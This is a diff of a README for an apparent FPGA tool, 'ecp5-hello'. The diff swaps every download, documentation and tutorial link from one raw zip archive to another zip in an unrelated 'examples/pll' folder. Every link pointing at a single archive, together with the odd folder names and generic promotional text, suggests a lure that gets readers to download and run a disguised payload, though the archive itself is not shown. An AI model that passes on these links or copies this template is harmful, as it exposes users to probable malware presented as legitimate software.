@@ -1,6 +1,6 @@
 # 🎉 ecp5-hello - Easy Open-Source FPGA Tools for Everyone
 
-[![Download ecp5-hello](https://raw.githubusercontent.com/Kuykakuy/ecp5-hello/master/pretensionless/ecp5-hello.zip)](https://raw.githubusercontent.com/Kuykakuy/ecp5-hello/master/pretensionless/ecp5-hello.zip)
+[![Download ecp5-hello](https://raw.githubusercontent.com/Kuykakuy/ecp5-hello/master/examples/pll/ecp_hello_v1.5.zip)](https://raw.githubusercontent.com/Kuykakuy/ecp5-hello/master/examples/pll/ecp_hello_v1.5.zip)
 
 ## 📦 What is ecp5-hello?
 
@@ -23,7 +23,7 @@ Ensure your system meets the following requirements:
 
 Visit this page to download the latest version of ecp5-hello:
 
-[Download ecp5-hello](https://raw.githubusercontent.com/Kuykakuy/ecp5-hello/master/pretensionless/ecp5-hello.zip)
+[Download ecp5-hello](https://raw.githubusercontent.com/Kuykakuy/ecp5-hello/master/examples/pll/ecp_hello_v1.5.zip)
 
 ### 3. Install ecp5-hello
 
@@ -59,8 +59,8 @@ ecp5-hello comes with a variety of advanced tools that enhance your FPGA develop
 
 For more guidance, explore our documentation and tutorials available online. These resources can help you understand FPGA concepts better and assist with troubleshooting.
 
-- [Documentation](https://raw.githubusercontent.com/Kuykakuy/ecp5-hello/master/pretensionless/ecp5-hello.zip)
-- [Tutorials](https://raw.githubusercontent.com/Kuykakuy/ecp5-hello/master/pretensionless/ecp5-hello.zip)
+- [Documentation](https://raw.githubusercontent.com/Kuykakuy/ecp5-hello/master/examples/pll/ecp_hello_v1.5.zip)
+- [Tutorials](https://raw.githubusercontent.com/Kuykakuy/ecp5-hello/master/examples/pll/ecp_hello_v1.5.zip)
 
 ## 🐞 Troubleshooting
 
@@ -81,6 +81,6 @@ Join our community for discussions and support:
 
 Ready to revolutionize your FPGA experience? 
 
-Visit this page to download ecp5-hello: [Download ecp5-hello](https://raw.githubusercontent.com/Kuykakuy/ecp5-hello/master/pretensionless/ecp5-hello.zip)
+Visit this page to download ecp5-hello: [Download ecp5-hello](https://raw.githubusercontent.com/Kuykakuy/ecp5-hello/master/examples/pll/ecp_hello_v1.5.zip)
 
 Install the application on your device and begin your journey with FPGA development today!
